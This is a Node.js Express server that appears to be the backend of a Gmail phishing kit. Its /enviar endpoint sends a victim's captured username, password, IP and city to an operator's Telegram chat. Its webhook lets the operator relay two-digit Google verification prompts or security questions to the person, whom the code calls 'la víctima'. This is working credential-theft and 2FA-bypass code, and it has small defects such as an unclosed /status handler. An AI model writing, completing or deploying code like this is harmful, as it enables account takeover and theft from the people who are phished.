const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const CLIENTES_DIR = './clientes';
if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}

const path = require('path');

// Limpieza automática cada 10 minutos: borra archivos de clientes con más de 60 minutos
setInterval(() => {
  const files = fs.readdirSync(CLIENTES_DIR);
  const ahora = Date.now();

  files.forEach(file => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    const edadMinutos = (ahora - stats.mtimeMs) / 60000;

    if (edadMinutos > 15) {
      fs.unlinkSync(fullPath);
      console.log(`🗑️ Eliminado: ${file} (tenía ${Math.round(edadMinutos)} minutos)`);
    }
  });
}, 10 * 60 * 1000);

function guardarCliente(txid, data) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
}

function cargarCliente(txid) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (fs.existsSync(ruta)) {
    return JSON.parse(fs.readFileSync(ruta));
  }
  return null;
}

app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;

  const mensaje = `
🔵GM4YL🔵
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const cliente = {
    status: "esperando",
    usar,
    clavv,
    preguntas: [],
    esperando: null,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑CONFIRMAR", callback_data: `confirmar:${txid}` },
        { text: "🔐CÓDIGO", callback_data: `codigo:${txid}` },
        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});


app.post('/webhook', async (req, res) => {
  const message = req.body.message;

  // Procesar comandos que empiecen con /
  if (message?.text && message.text.startsWith('/')) {
    const texto = message.text.trim();
    const partes = texto.split(' ');
    const txidParte = partes[0].slice(1);  // Quita el /
    const codigoStr = partes[1]?.trim();  // Puede ser undefined

    let codigo = null;
    if (codigoStr && /^\d{2}$/.test(codigoStr)) {
      codigo = codigoStr;  // Solo acepta exactamente 2 dígitos
    }

    const cliente = cargarCliente(txidParte) || { status: 'esperando', codigo: null };

    if (codigo !== null) {
      // Caso: /txid 22  → enviar código de verificación
      cliente.codigo = codigo;
      cliente.status = 'codigo';
      guardarCliente(txidParte, cliente);

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: message.chat.id,
          text: `✅ Código "${codigo}" enviado para el ID ${txidParte}\nLa víctima será redirigida a la pantalla de verificación Google.`
        })
      });
    } else {
      // Caso antiguo: /txid ¿Pregunta1?&¿Pregunta2?
      const preguntasTexto = partes.slice(1).join(' ');
      const [pregunta1, pregunta2] = preguntasTexto.split('&');

      if (!pregunta1 || !pregunta2) {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: message.chat.id,
            text: `⚠️ Formato inválido.\n\nPara preguntas:\n/${txidParte} ¿Dónde naciste?&¿Color favorito?\n\nPara enviar código:\n/${txidParte} 22`
          })
        });
        return res.sendStatus(200);
      }

      cliente.preguntas = [pregunta1.trim(), pregunta2.trim()];
      cliente.status = 'preguntas';
      guardarCliente(txidParte, cliente);

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: message.chat.id,
          text: `✅ Preguntas guardadas para ${txidParte}\n1️⃣ ${pregunta1.trim()}\n2️⃣ ${pregunta2.trim()}`
        })
      });
    }

    return res.sendStatus(200);
  }

  // === El resto del código (callback_query) sigue igual ===
  if (req.body.callback_query) {
    // ... (tu código existente de callbacks: confirmar, codigo, errorlogo, etc.)
  }

  res.sendStatus(200);
});

app.get('/status', (req, res) => {
  const txid = req.query.txid;
  if (!txid) {
    return res.status(400).json({ error: "Falta txid" });
  }
  const cliente = cargarCliente(txid);
  if (!cliente) {
    return res.status(404).json({ error: "No encontrado" });
  }
  res.json({
    codigo: cliente.codigo || null   // solo envía el código de 2 dígitos si existe
  });

app.get('/', (req, res) => res.send("Servidor activo en Render"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en Render puerto ${PORT}`));
